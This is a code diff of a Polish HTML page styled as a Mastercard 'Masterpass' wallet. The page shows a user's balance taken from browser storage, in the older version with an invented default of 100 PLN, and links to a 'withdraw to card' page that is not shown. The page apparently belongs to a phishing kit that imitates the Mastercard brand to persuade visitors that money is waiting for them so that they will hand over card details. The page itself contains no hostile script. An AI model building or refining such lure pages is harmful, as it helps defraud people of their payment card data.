@@ -1,59 +1,39 @@
 <!DOCTYPE html>
 <html lang="pl">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Portfel Masterpass</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="icon" href="https://img.icons8.com/ios-filled/50/000000/mastercard-logo.png" />
-  </head>
-  <body class="bg-black flex items-center justify-center min-h-screen font-sans">
-    <div class="bg-white w-[480px] sm:w-[640px] rounded shadow-lg">
-      <!-- Header -->
-      <div class="flex items-center justify-between p-4 border-b">
-        <div class="flex items-center space-x-2">
-          <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" class="w-8 h-8" />
-          <div class="text-sm font-semibold">
-            masterpass <span class="text-gray-500 text-xs block">by mastercard.</span>
-          </div>
-        </div>
-        <button onclick="logout()" class="text-red-600 hover:underline text-sm">Wyloguj się</button>
-      </div>
-
-      <!-- Main Content -->
-      <div class="p-6 space-y-6">
-        <h2 class="text-lg font-semibold">Witaj, <span id="userName">Użytkowniku</span></h2>
-        <div>
-          <p class="text-sm text-gray-700">Twój dostępny balans:</p>
-          <p class="text-2xl font-bold text-green-600">PLN <span id="userBalance">0.00</span></p>
-        </div>
-
-        <div>
-          <button onclick="location.href='card.html'" class="bg-red-600 hover:bg-red-700 text-white w-full py-2 rounded transition">
-            Wypłać na kartę
-          </button>
-        </div>
-      </div>
-
-      <!-- Footer -->
-      <div class="text-center text-xs bg-black text-white p-2">
-        Ta strona używa plików cookies zgodnie z polityką prywatności.
-      </div>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Portfel</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-black flex items-center justify-center min-h-screen">
+  <div class="bg-white w-[480px] sm:w-[640px] rounded shadow-lg p-6 space-y-6">
+    <div class="flex justify-between items-center border-b pb-2">
+      <h1 class="text-lg font-semibold text-gray-700">Portfel Masterpass™</h1>
+      <button onclick="logout()" class="text-sm text-red-500 underline">Wyloguj się</button>
     </div>
 
-    <script>
-      const user = JSON.parse(localStorage.getItem("user"));
-      if (!user) {
-        window.location.href = "index.html";
-      } else {
-        document.getElementById("userName").textContent = user.email || "Użytkowniku";
-        document.getElementById("userBalance").textContent = user.balance || "100.00";
-      }
+    <div>
+      <p class="text-sm text-gray-600">Użytkownik: <span id="userEmail" class="font-medium text-black"></span></p>
+      <p class="text-sm text-gray-600">Saldo: <span id="userBalance" class="font-bold text-green-600"></span> PLN</p>
+    </div>
 
-      function logout() {
-        localStorage.removeItem("user");
-        window.location.href = "index.html";
-      }
-    </script>
-  </body>
+    <div class="pt-4">
+      <a href="card.html" class="block bg-orange-500 hover:bg-orange-600 text-white py-2 rounded text-center">Wypłać środki na kartę</a>
+    </div>
+  </div>
+
+  <script>
+    const user = JSON.parse(localStorage.getItem('user'));
+    if (!user) window.location.href = 'index.html';
+
+    document.getElementById('userEmail').textContent = user.email;
+    document.getElementById('userBalance').textContent = user.balance;
+
+    function logout() {
+      localStorage.removeItem('user');
+      window.location.href = 'index.html';
+    }
+  </script>
+</body>
 </html>
